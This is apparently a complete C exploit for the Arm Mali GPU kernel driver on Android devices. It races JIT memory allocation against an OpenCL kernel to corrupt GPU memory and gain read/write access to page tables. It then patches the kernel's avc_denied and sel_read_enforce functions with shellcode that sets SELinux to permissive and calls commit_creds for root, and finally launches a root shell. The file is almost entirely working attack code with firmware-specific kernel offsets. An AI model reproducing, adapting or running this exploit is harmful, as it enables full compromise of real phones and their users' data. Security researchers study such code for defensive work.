#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/syscall.h>
#include <pthread.h>

//From https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17
#include "CL/cl.h"
#include "mali_kbase_ioctl.h"
#include "mali_base_csf_kernel.h"
#include "mali_base_kernel.h"
#include "mem_read_write.h"
#include "mempool_utils.h"
#include "firmware_offsets.h"

#define MALI "/dev/mali0"

//#define GROW_SIZE 0x2000

#define GROW_SIZE (0x2000 - 10)

#define FREED_NUM 1

#define JIT_SIZE 0x23d0

#define FAULT_SIZE 0x300

#define PTE_PAGES 0x200

#define PTE_SIZE (PTE_PAGES << 12)

#define TEST_VAL 0x42424242

#define THRESHOLD 0x2300

#define REUSE_REG_SIZE 0x100

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];

uint64_t reused_regions[REUSE_REG_SIZE] = {0};

static uint64_t sel_read_enforce = SEL_READ_ENFORCE_2311;

static uint64_t avc_deny = AVC_DENY_2311;

/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

int find_mali_fd() {
  int test_fd = open("/dev/null", O_RDWR);
  char file_path[256];
  char proc_string[256];
  for (int i = 3; i < test_fd; i++) {
    sprintf(proc_string, "/proc/self/fd/%d", i);
    if(readlink(proc_string, file_path, 256) > 0) {
      if (strcmp(file_path, MALI) == 0) {
        close(test_fd);
        return i;
      }
    }
  }
  close(test_fd);
  return -1;
}

void setup_mali(int fd, int group_id) {

  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    LOG("major %d\n", param.major);
    err(1, "version check failed\n");
  }

  struct kbase_ioctl_set_flags set_flags = {group_id << 3};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  }
}

void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
  if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    LOG("commit failed\n");
  }
}

uint64_t get_mem_size(int fd, uint64_t gpu_addr) {
  union kbase_ioctl_mem_query query = {0};
  query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
  query.in.gpu_addr = gpu_addr;
  mem_query(fd, &query);
  return query.out.value;
}

void queue_register(int fd, uint64_t queue_addr, uint32_t queue_pages) {
  struct kbase_ioctl_cs_queue_register reg = {0};
  reg.buffer_gpu_addr = queue_addr;
  reg.buffer_size = queue_pages;
  if (ioctl(fd, KBASE_IOCTL_CS_QUEUE_REGISTER, &reg) < 0) {
    err(1, "register queue failed\n");
  }
}

uint64_t queue_bind(int fd, uint64_t queue_addr, uint8_t group_handle, uint8_t csi_index) {
  union kbase_ioctl_cs_queue_bind bind = {0};
  bind.in.buffer_gpu_addr = queue_addr;
  bind.in.group_handle = group_handle;
  bind.in.csi_index = csi_index;
  if (ioctl(fd, KBASE_IOCTL_CS_QUEUE_BIND, &bind) < 0) {
    err(1, "bind queue failed\n");
  }
  return bind.out.mmap_handle;
}

uint8_t kcpu_queue_new(int fd) {
  struct kbase_ioctl_kcpu_queue_new queue_new = {0};
  if (ioctl(fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &queue_new) < 0) {
    err(1, "kcpu queue create failed\n");
  }
  return queue_new.id;
}

void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
  struct kbase_ioctl_mem_jit_init init = {0};
  init.va_pages = va_pages;
  init.max_allocations = 255;
  init.trim_level = trim_level;
  init.group_id = group_id;
  init.phys_pages = va_pages;

  if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0) {
    err(1, "jit init failed\n");
  }
}

uint64_t jit_allocate(int fd, uint8_t queue_id, uint8_t jit_id, uint64_t va_pages, uint64_t commit_pages, uint8_t bin_id, uint16_t usage_id, uint64_t gpu_alloc_addr) {
  *((uint64_t*)gpu_alloc_addr) = 0;
  struct base_jit_alloc_info info = {0};
  info.id = jit_id;
  info.gpu_alloc_addr = gpu_alloc_addr;
  info.va_pages = va_pages;
  info.commit_pages = commit_pages;
  info.extension = 1;
  info.bin_id = bin_id;
  info.usage_id = usage_id;

  struct base_kcpu_command_jit_alloc_info jit_alloc_info = {0};
  jit_alloc_info.info = (uint64_t)(&info);
  jit_alloc_info.count = 1;
  struct base_kcpu_command cmd = {0};
  cmd.info.jit_alloc = jit_alloc_info;
  cmd.type = BASE_KCPU_COMMAND_TYPE_JIT_ALLOC;
  struct kbase_ioctl_kcpu_queue_enqueue enq = {0};
  enq.id = queue_id;
  enq.nr_commands = 1;
  enq.addr = (uint64_t)(&cmd);
  if (ioctl(fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq) < 0) {
    err(1, "jit allocate failed\n");
  }
  volatile uint64_t ret = *((uint64_t*)gpu_alloc_addr);
  while (ret == 0) {
    ret = *((uint64_t*)gpu_alloc_addr);
  }
  return ret; 
}

void jit_free(int fd, uint8_t queue_id, uint8_t jit_id) {
  uint8_t free_id = jit_id;
  struct base_kcpu_command_jit_free_info info = {0};
  info.ids = (uint64_t)(&free_id);
  info.count = 1;
  struct base_kcpu_command cmd = {0};
  cmd.info.jit_free = info;
  cmd.type = BASE_KCPU_COMMAND_TYPE_JIT_FREE;
  struct kbase_ioctl_kcpu_queue_enqueue enq = {0};
  enq.id = queue_id;
  enq.nr_commands = 1;
  enq.addr = (uint64_t)(&cmd);
  if (ioctl(fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq) < 0) {
    err(1, "jit free failed\n");
  }
}

void* jit_grow(void* args) {
  uint64_t* arguments = (uint64_t*)args;
  int mali_fd = arguments[0];
  int qid = arguments[1];
  int jit_id = arguments[2];
  uint64_t gpu_alloc_addr = arguments[3];
  uint64_t addr = jit_allocate(mali_fd, qid, jit_id, JIT_SIZE, GROW_SIZE, 1, 1, gpu_alloc_addr);
  LOG("jit_grow addr %lx\n", addr);
  return NULL;
}

void create_reuse_regions(int mali_fd, uint64_t* reuse_regions, size_t size) {
  for (int i = 0; i < size; i++) {
    reuse_regions[i] = (uint64_t)map_gpu(mali_fd, 1, 1, false, 0);
    memset((void*)(reused_regions[i]), 0, 0x1000);
  }
}

uint64_t find_reused_page(uint64_t* reuse_regions, size_t size) {
  for (int i = 0; i < size; i++) {
    uint64_t* region_start = (uint64_t*)(reused_regions[i]);
    for (int j = 0; j < 0x1000/sizeof(uint64_t); j++) {
      if (region_start[j] == TEST_VAL) {
        LOG("found reused page %lx, %d\n", (uint64_t)region_start, j);
        return (uint64_t)region_start;
      }
    }
  }
  return -1;
}

int find_pgd(int mali_fd, uint64_t gpu_addr, cl_command_queue command_queue, struct rw_mem_kernel* kernel, uint64_t* out) {
  int ret = -1;
  uint64_t read_addr = gpu_addr;
  for (int i = 0; i < 0x1000/8; i++) {
	uint64_t entry = read_from(mali_fd, &read_addr, command_queue, kernel);
    read_addr += 8;
	if ((entry & 0x443) == 0x443) {
      *out = entry;
	  return i;
	}
  }
  return ret;
}

void write_shellcode(int mali_fd, uint64_t pgd, uint64_t* reserved, cl_command_queue command_queue, struct rw_mem_kernel* kernel, struct rw_mem_kernel* kernel32) {
  uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  uint64_t overwrite_index = pgd + OVERWRITE_INDEX * sizeof(uint64_t);
  write_to(mali_fd, &overwrite_index, &avc_deny_addr, command_queue, kernel);

  usleep(100000);
  //Go through the reserve pages addresses to write to avc_denied with our own shellcode
  write_func(mali_fd, avc_deny, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t), RESERVED_SIZE, command_queue, kernel32);

  //Triggers avc_denied to disable SELinux
  open("/dev/kmsg", O_RDONLY);

  uint64_t sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, &overwrite_index, &sel_read_enforce_addr, command_queue, kernel);

  //Call commit_creds to overwrite process credentials to gain root
  write_func(mali_fd, sel_read_enforce, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t), RESERVED_SIZE, command_queue, kernel32);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  fixup_root_shell(INIT_CRED_2311, COMMIT_CREDS_2311, SEL_READ_ENFORCE_2311, ADD_INIT_2311, ADD_COMMIT_2311, &(root_code[0]));
  cl_platform_id platform_id = NULL;
  cl_device_id device_id = NULL;
  cl_uint ret_num_devices;
  cl_uint ret_num_platforms;

  cl_int ret = clGetPlatformIDs(1, &platform_id, &ret_num_platforms);
  if (ret != CL_SUCCESS) {
    err(1, "fail to get platform\n");
  }
  int mali_fd = find_mali_fd();
  LOG("mali_fd %d\n", mali_fd);

  uint8_t qid = kcpu_queue_new(mali_fd);
  void* gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);
  memset(gpu_alloc_addr, 0, 0x1000);

  uint64_t test_jit_id = 1;
  uint64_t test_jit_addr = jit_allocate(mali_fd, qid, test_jit_id, 1, 0, 0, 0, (uint64_t)gpu_alloc_addr);
  uint64_t remainder = test_jit_addr % PTE_SIZE;
  if (remainder) {
    test_jit_id++;
    jit_allocate(mali_fd, qid, test_jit_id, (PTE_PAGES + 1 - (remainder >> 12)), 0, 0, 0, (uint64_t)gpu_alloc_addr);        
  }

  uint64_t corrupted_jit_id = test_jit_id + 1;
  uint64_t second_jit_id = corrupted_jit_id + 1;

  uint64_t corrupted_jit_addr = jit_allocate(mali_fd, qid, corrupted_jit_id, JIT_SIZE, 1, 1, 1, (uint64_t)gpu_alloc_addr);

  LOG("corrupted_jit_addr %lx\n", corrupted_jit_addr);

  jit_free(mali_fd, qid, corrupted_jit_id);

  ret = clGetDeviceIDs( platform_id, CL_DEVICE_TYPE_DEFAULT, 1, 
            &device_id, &ret_num_devices);
  if (ret != CL_SUCCESS) {
    err(1, "fail to get Device ID\n");
  }

  cl_context context = clCreateContext( NULL, 1, &device_id, NULL, NULL, &ret);
  if (ret != CL_SUCCESS) {
    err(1, "fail to create context\n");
  }

  cl_command_queue command_queue = clCreateCommandQueueWithProperties(context, device_id, NULL, &ret);
  if (ret != CL_SUCCESS) {
    err(1, "fail to create command_queue\n");
  }


  uint64_t write_addr = corrupted_jit_addr + FAULT_SIZE * 0x1000;
  uint64_t value = 32;
  uint64_t write = 1;

  struct rw_mem_kernel kernel = create_rw_mem(context, &device_id, true);
  struct rw_mem_kernel kernel32 = create_rw_mem(context, &device_id, false);

  ret = clEnqueueWriteBuffer(command_queue, kernel.va, CL_TRUE, 0, sizeof(uint64_t), &write_addr, 0, NULL, NULL);
  ret = clEnqueueWriteBuffer(command_queue, kernel.in_out, CL_TRUE, 0, sizeof(uint64_t), &value, 0, NULL, NULL);
  ret = clEnqueueWriteBuffer(command_queue, kernel.flag, CL_TRUE, 0, sizeof(uint64_t), &write, 0, NULL, NULL);

  if (ret != CL_SUCCESS) {
    err(1, "Failed to write to buffer\n");
  }

  size_t global_work_size = 1;
  size_t local_work_size = 1;
  LOG("queue kernel\n");
  pthread_t thread;
  uint64_t args[4];
  args[0] = mali_fd;
  args[1] = qid;
  args[2] = corrupted_jit_id;
  args[3] = (uint64_t)gpu_alloc_addr;

  pthread_create(&thread, NULL, &jit_grow, (void*)&(args[0]));
  ret = clEnqueueNDRangeKernel(command_queue, kernel.kernel, 1, NULL, &global_work_size, &local_work_size, 0, NULL, NULL);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to enqueue kernel\n");
  }
  usleep(10000);
  ret = clFlush(command_queue);
  
  pthread_join(thread, NULL);
  uint64_t region_size = get_mem_size(mali_fd, corrupted_jit_addr);
  LOG("Size after grow: %lx\n", region_size);

  write_addr = corrupted_jit_addr + (FAULT_SIZE + GROW_SIZE + 0xd0) * 0x1000;
  write_to(mali_fd, &write_addr, &value, command_queue, &kernel);

  uint64_t final_grow_size = get_mem_size(mali_fd, corrupted_jit_addr);
  LOG("Final grow size: %lx\n", final_grow_size);

  uint64_t keep_alive_jit_addr = jit_allocate(mali_fd, qid, second_jit_id + 1, 10, 10, 0, 0, (uint64_t)gpu_alloc_addr);
  LOG("keep alive jit_addr %lx\n", keep_alive_jit_addr);

  jit_free(mali_fd, qid, corrupted_jit_id);
  usleep(10000);
  uint64_t trimmed_size = get_mem_size(mali_fd, corrupted_jit_addr);
  LOG("Size after free: %lx, trim_level %lu\n", trimmed_size, 100 - (trimmed_size * 100)/final_grow_size);

  uint64_t reclaim_addr = jit_allocate(mali_fd, qid, corrupted_jit_id, JIT_SIZE, trimmed_size, 1, 1, (uint64_t)gpu_alloc_addr);
  if (reclaim_addr != corrupted_jit_addr) {
    err(1, "Inconsistent address when reclaiming freed jit region %lx %lx\n", reclaim_addr, corrupted_jit_addr);
  }

  create_reuse_regions(mali_fd, &(reused_regions[0]), REUSE_REG_SIZE);

  value = TEST_VAL;
  write_addr = corrupted_jit_addr + (THRESHOLD) * 0x1000;
  LOG("writing to gpu_va %lx\n", write_addr);
  write_to(mali_fd, &write_addr, &value, command_queue, &kernel);

  uint64_t reused_addr = find_reused_page(&(reused_regions[0]), REUSE_REG_SIZE);
  if (reused_addr == -1) {
    err(1, "Cannot find reused page\n");
  }
  reserve_pages(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  uint64_t drain = drain_mem_pool(mali_fd);
  release_mem_pool(mali_fd, drain);

  mem_commit(mali_fd, reused_addr, 0);
  map_reserved(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));

  uint64_t entry = 0;
  int res = find_pgd(mali_fd, write_addr, command_queue, &kernel, &entry);
  if (res == -1) {
    err(1, "Cannot find page table entry\n");
  }
  LOG("pgd entry found at index %d %lx\n", res, entry);

  write_shellcode(mali_fd, write_addr, &(reserved[0]), command_queue, &kernel, &kernel32);
  run_enforce();
  cleanup(mali_fd, write_addr, command_queue, &kernel);

  ret = clFinish(command_queue);
  releaseKernel(&kernel);
  releaseKernel(&kernel32);
  ret = clReleaseCommandQueue(command_queue);
  ret = clReleaseContext(context);
  system("sh");
 }
